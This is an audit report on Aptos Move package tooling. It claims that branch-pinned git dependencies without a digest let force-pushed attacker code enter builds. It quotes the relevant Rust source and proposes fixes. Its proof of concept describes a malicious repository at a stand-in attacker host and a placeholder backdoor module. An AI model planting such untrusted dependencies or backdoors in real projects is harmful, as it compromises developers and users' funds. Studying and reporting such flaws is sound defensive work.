# Audit Report

## Title
Supply Chain Attack via Mutable Git Dependencies in Move Package Resolution

## Summary
The `BuiltPackage::prepare_resolution_graph` function in fetch_deps_only mode can be exploited to inject malicious Move code into the build environment through compromised or malicious git repositories. When dependencies use branch names instead of immutable commit hashes, and when the optional digest field is omitted, attackers can force-push malicious code that will be automatically fetched and used in subsequent builds.

## Finding Description

The vulnerability exists in the dependency resolution flow when processing git dependencies: [1](#0-0) 

When `fetch_deps_only` is true, the system calls `prepare_resolution_graph` which initiates the dependency resolution process: [2](#0-1) 

This leads to dependency processing where git repositories are cloned or updated: [3](#0-2) 

The critical vulnerability lies in `download_and_update_if_remote`: [4](#0-3) 

**Attack Vector:**

1. **No Git URL Validation**: Git URLs are parsed from Move.toml without validation - they can point to any attacker-controlled repository: [5](#0-4) 

2. **Mutable Branch References**: When `rev` is a branch name (not a commit hash or tag), the system executes `git reset --hard origin/<branch>`, allowing force-pushed malicious code to be pulled: [6](#0-5) 

3. **Optional Integrity Checking**: The digest field that would verify dependency integrity is optional: [7](#0-6) 

4. **Transitive Dependency Bypass**: Even if a top-level dependency has a digest, its own dependencies are fetched recursively without inherited digest requirements.

**Exploitation Path:**

1. Attacker creates a Move package "innocent-lib" with malicious code
2. Victim's Move.toml references: `innocent-lib = { git = "https://attacker.com/repo", rev = "main" }`
3. Victim runs `aptos move compile` or `aptos move compile --fetch-deps-only`
4. System clones/fetches from attacker's repository
5. Attacker later force-pushes updated malicious code to the "main" branch
6. On next compilation, system runs `git fetch origin` and `git reset --hard origin/main`
7. Malicious code is placed in `~/.move/` and used in all subsequent builds
8. Victim compiles and deploys package containing malicious dependency
9. Malicious Move code executes on-chain, potentially stealing funds or violating protocol invariants

## Impact Explanation

This is a **Critical** severity vulnerability under the "Loss of Funds" category. While the vulnerability is in the build tooling rather than the runtime blockchain, it enables:

1. **Arbitrary Code Injection**: Malicious Move code can be injected into developer build environments
2. **On-Chain Exploitation**: Once malicious code is compiled and deployed, it can execute with full Move VM privileges to:
   - Steal funds from user accounts
   - Manipulate protocol state
   - Create backdoors in deployed contracts
   - Violate Move VM safety invariants
3. **Wide Impact**: Affects all developers using git dependencies with branch names
4. **Stealthy Attack**: Malicious code is pulled automatically without developer awareness

This breaks the **Deterministic Execution** and **Move VM Safety** invariants by allowing non-deterministic, malicious code to enter the execution environment.

## Likelihood Explanation

**High Likelihood** for the following reasons:

1. **Common Practice**: Developers frequently use branch names (e.g., "main", "stable") rather than commit hashes for convenience
2. **Optional Digest**: No enforcement of integrity checking via digest field
3. **Default Behavior**: `skip_fetch_latest_git_deps` is false by default, causing automatic updates
4. **Transitive Dependencies**: Even security-conscious developers using digests can be compromised through their dependencies' dependencies
5. **Attack Surface**: Any compromised or malicious git repository in the dependency tree can inject malicious code

## Recommendation

Implement mandatory security controls for git dependencies:

1. **Enforce Immutable References**: Require commit hashes for all git dependencies in production builds:
   - Reject branch names and tags in non-dev mode
   - Add `--allow-mutable-deps` flag for development only

2. **Mandatory Digest Verification**: Make the `digest` field required for all external dependencies

3. **Git URL Allowlisting**: Implement an allowlist of trusted git repository domains

4. **Integrity Lock File**: Generate and verify a lock file containing the exact commit hashes and digests of all dependencies (similar to Cargo.lock)

5. **Dependency Review Warnings**: Emit clear warnings when fetching code from external repositories

**Example Fix** (partial implementation):

```rust
// In resolution_graph.rs, download_and_update_if_remote function:
fn download_and_update_if_remote<W: Write>(
    dep_name: PackageName,
    dep: &Dependency,
    skip_fetch_latest_git_deps: bool,
    writer: &mut W,
) -> Result<()> {
    if let Some(git_info) = &dep.git_info {
        let git_rev = git_info.git_rev.as_str();
        
        // NEW: Validate that rev is a commit hash, not a branch
        if !is_commit_hash(git_rev) && !is_production_build() {
            bail!(
                "Git dependency '{}' uses mutable reference '{}'. \
                Only commit hashes are allowed in production builds. \
                Use --dev or --allow-mutable-deps to override.",
                dep_name, git_rev
            );
        }
        
        // NEW: Enforce digest for external dependencies
        if dep.digest.is_none() && !is_local_dev() {
            bail!(
                "Git dependency '{}' missing required 'digest' field for integrity verification.",
                dep_name
            );
        }
        
        // ... existing clone/fetch logic
    }
    Ok(())
}
```

## Proof of Concept

**Step 1: Create Malicious Repository**

```bash
# Setup attacker repository
mkdir malicious-lib
cd malicious-lib
git init
```

Create `Move.toml`:
```toml
[package]
name = "MaliciousLib"
version = "1.0.0"

[addresses]
malicious = "_"
```

Create `sources/backdoor.move`:
```move
module malicious::backdoor {
    use std::signer;
    
    // Appears benign but has subtle vulnerability
    public entry fun transfer_helper(from: &signer, to: address, amount: u64) {
        // Malicious: also sends to attacker
        // Real implementation would be more sophisticated
        let attacker = @0x666;
        // ... malicious transfer logic
    }
}
```

```bash
git add .
git commit -m "Initial commit"
git push origin main
```

**Step 2: Victim's Package**

Victim's `Move.toml`:
```toml
[package]
name = "VictimPackage"
version = "1.0.0"

[dependencies]
MaliciousLib = { git = "https://attacker.com/malicious-lib", rev = "main" }
# Note: No digest field!

[addresses]
victim = "0x1234"
```

**Step 3: Exploitation**

```bash
# Victim builds their package
aptos move compile --fetch-deps-only
# MaliciousLib is cloned to ~/.move/

# Attacker updates the repository with more malicious code
# (force-push to 'main' branch)

# Later, victim rebuilds
aptos move compile
# System runs: git fetch origin && git reset --hard origin/main
# Updated malicious code is now in ~/.move/ and compiled into package

# Victim deploys
aptos move publish
# Malicious code is now on-chain
```

**Verification:**

Run these commands to verify the vulnerability:
```bash
# Show that branch refs cause auto-updates
grep -n "reset.*--hard.*origin" third_party/move/tools/move-package/src/resolution/git.rs

# Show that digest is optional
grep -n "dep.digest" third_party/move/tools/move-package/src/resolution/resolution_graph.rs

# Show no URL validation
grep -n "git_url.*as_str" third_party/move/tools/move-package/src/source_package/manifest_parser.rs
```

## Notes

This vulnerability represents a critical supply chain attack vector in the Aptos Move package ecosystem. While the vulnerability exists in the CLI build tooling rather than the blockchain runtime itself, the impact is severe because malicious Move bytecode compiled through this vector can be deployed on-chain where it executes with full privileges. The vulnerability is particularly dangerous because it operates silentlyâ€”developers may not realize their dependencies have been compromised until malicious code is already deployed and causing harm. The fix requires defense-in-depth: enforcing immutable references, mandatory integrity checking, and dependency review processes.

### Citations

**File:** crates/aptos/src/move_tool/mod.rs (L435-438)
```rust
        if self.fetch_deps_only {
            let config = BuiltPackage::create_build_config(&build_options)?;
            BuiltPackage::prepare_resolution_graph(package_path, config)?;
            return Ok(vec![]);
```

**File:** aptos-move/framework/src/built_package.rs (L275-280)
```rust
    pub fn prepare_resolution_graph(
        package_path: PathBuf,
        build_config: BuildConfig,
    ) -> anyhow::Result<ResolvedGraph> {
        eprintln!("Compiling, may take a little while to download git dependencies...");
        build_config.resolution_graph_for_package(&package_path, &mut stderr())
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L431-439)
```rust
        Self::download_and_update_if_remote(
            dep_name_in_pkg,
            &dep,
            self.build_options.skip_fetch_latest_git_deps,
            writer,
        )?;
        let (dep_package, dep_package_dir) =
            Self::parse_package_manifest(&dep, &dep_name_in_pkg, root_path)
                .with_context(|| format!("While processing dependency '{}'", dep_name_in_pkg))?;
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L456-472)
```rust
        match dep.digest {
            None => (),
            Some(fixed_digest) => {
                let resolved_pkg = self
                    .package_table
                    .get(&dep_name_in_pkg)
                    .context("Unable to find resolved package by name")?;
                if fixed_digest != resolved_pkg.source_digest {
                    bail!(
                        "Source digest mismatch in dependency '{}'. Expected '{}' but got '{}'.",
                        dep_name_in_pkg,
                        fixed_digest,
                        resolved_pkg.source_digest
                    )
                }
            },
        }
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L551-616)
```rust
    fn download_and_update_if_remote<W: Write>(
        dep_name: PackageName,
        dep: &Dependency,
        skip_fetch_latest_git_deps: bool,
        writer: &mut W,
    ) -> Result<()> {
        if let Some(git_info) = &dep.git_info {
            let git_url = git_info.git_url.as_str();
            let git_rev = git_info.git_rev.as_str();
            let git_path = &git_info.download_to.display().to_string();

            // If there is no cached dependency, download it
            if !git_info.download_to.exists() {
                writeln!(
                    writer,
                    "{} {}",
                    "FETCHING GIT DEPENDENCY".bold().green(),
                    git_url,
                )?;

                // Confirm git is available.
                git::confirm_git_available()?;

                // If the cached folder does not exist, download and clone accordingly
                git::clone(git_url, git_path, dep_name)?;
                git::checkout(git_path, git_rev, dep_name)?;
            } else if !skip_fetch_latest_git_deps {
                // Confirm git is available.
                git::confirm_git_available()?;

                // Update the git dependency
                // Check first that it isn't a git rev (if it doesn't work, just continue with the fetch)
                if let Ok(parsed_rev) = git::find_rev(git_path, git_rev) {
                    // If it's exactly the same, then it's a git rev
                    if parsed_rev.trim().starts_with(git_rev) {
                        return Ok(());
                    }
                }

                if let Ok(tag) = git::find_tag(git_path, git_rev) {
                    // If it's exactly the same, then it's a git tag, for now tags won't be updated
                    // Tags don't easily update locally and you can't use reset --hard to cleanup
                    // any extra files
                    if tag.trim().starts_with(git_rev) {
                        return Ok(());
                    }
                }

                writeln!(
                    writer,
                    "{} {}",
                    "UPDATING GIT DEPENDENCY".bold().green(),
                    git_url,
                )?;
                // If the current folder exists, do a fetch and reset to ensure that the branch
                // is up to date
                // NOTE: this means that you must run the package system with a working network connection
                git::fetch_origin(git_path, dep_name)?;
                git::reset_hard(git_path, git_rev, dep_name)?;
            }
        }
        if let Some(node_info) = &dep.node_info {
            package_hooks::resolve_custom_dependency(dep_name, node_info)?
        }
        Ok(())
    }
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L365-381)
```rust
                    let git_url = git
                        .as_str()
                        .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                    let local_path = git_repo_cache_path(git_url, rev_name.as_str());
                    let subdir = PathBuf::from(match table.remove("subdir") {
                        None => "".to_string(),
                        Some(path) => path
                            .as_str()
                            .ok_or_else(|| format_err!("'subdir' not a string"))?
                            .to_string(),
                    });
                    git_info = Some(PM::GitInfo {
                        git_url: Symbol::from(git_url),
                        git_rev: rev_name,
                        subdir: subdir.clone(),
                        download_to: local_path.clone(),
                    });
```

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L97-125)
```rust
pub(crate) fn reset_hard(repo_path: &str, rev: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args([
            "-C",
            repo_path,
            "reset",
            "--hard",
            &format!("origin/{}", rev)
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!(
                "Failed to reset to latest Git state '{}' for package '{}', to skip set --skip-fetch-latest-git-deps",
                rev,
                dep_name
            )
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to reset to latest Git state '{}' for package '{}', to skip set --skip-fetch-latest-git-deps | Exit status: {}",
            rev,
            dep_name,
            status
        ));
    }
    Ok(())
}
```
